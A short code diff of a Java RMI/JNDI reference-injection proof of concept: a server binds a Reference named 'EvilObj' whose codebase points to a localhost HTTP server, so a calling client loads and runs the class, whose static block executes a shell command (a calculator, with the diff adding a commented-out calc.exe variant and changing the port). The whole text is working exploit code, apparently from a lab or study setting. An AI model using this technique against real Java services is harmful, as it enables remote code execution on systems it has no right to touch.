@@ -20,7 +20,7 @@ public class HZWJavaRMI {
         Reference ref = new Reference(
                 "EvilObj",
                 "EvilObj",
-                "http://127.0.0.1:8002/");  // 指定rmi调用方从指定位置加载目标类
+                "http://127.0.0.1:8001/");  // 指定rmi调用方从指定位置加载目标类
         ReferenceWrapper refW = new ReferenceWrapper(ref);
         reg.bind("evil",refW);
     }
@@ -30,6 +30,7 @@ class EvilObj {
     static{
         System.out.println("hello evil");
         String [] cmd={"/bin/sh","-c","kcalc"};
+//        String [] cmd={"/bin/sh","-c","calc.exe"};
         try {
             Process proc =Runtime.getRuntime().exec(cmd);
         } catch (IOException e) {
